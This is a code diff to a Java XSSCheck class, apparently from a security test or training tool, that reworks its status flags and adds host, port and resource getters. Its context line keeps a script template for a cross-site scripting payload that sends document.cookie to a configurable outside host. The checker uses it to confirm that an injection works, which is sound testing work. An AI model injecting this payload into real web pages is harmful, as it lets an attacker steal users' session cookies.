@@ -11,9 +11,11 @@ public class XSSCheck {
     private int port;
     private String resource;
     private String scriptTemplate = "<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>"; //generic template
-    private static final Logger log = Logger.getLogger(Admin.class);
 
-    private boolean xssfound = false;
+    private static final Logger log = Logger.getLogger(XSSCheck.class);
+
+    private boolean xssURLCalled = false;
+    private boolean xssCookiePassed = false;
     private String xssCookieValue;
     private List<String> tokenizedCookies;
     private Map<String, String> cookiesAndValues = new HashMap<String, String>();
@@ -40,14 +42,39 @@ public class XSSCheck {
         return String.format(scriptTemplate, host, Integer.valueOf(port), resource);
     }
 
-    public boolean getXSSFountStatus() {
-        log.info("The XSS fount status is requested");
-        return this.xssfound;
+    public String getResource() {
+        log.info("The XSS checker resource is requested");
+        return this.resource;
     }
 
-    public void setXSSFountStatus(boolean set) {
-        log.info("The XSS fount status is set to " + set);
-        xssfound = set;
+    public int getPort() {
+        log.info("The XSS checker port is requested");
+        return this.port;
+    }
+
+    public String getHost() {
+        log.info("The XSS checker host is requested");
+        return this.host;
+    }
+
+    public boolean getXSSCookiePassedStatus() {
+        log.info("The XSS cookie passed status is requested");
+        return this.xssCookiePassed;
+    }
+
+    public void setXSSCookiePassedStatus(boolean set) {
+        log.info("The XSS cookie passed status is set to " + set);
+        xssCookiePassed = set;
+    }
+
+    public boolean getXSSURLCalledStatus() {
+        log.info("The XSS URL called status is requested");
+        return this.xssURLCalled;
+    }
+
+    public void setXSSURLCalledStatus(boolean set) {
+        log.info("The XSS URL called status is set to " + set);
+        xssURLCalled = set;
     }
 
     public void setXSSCookiesValue(String cookieValue) {
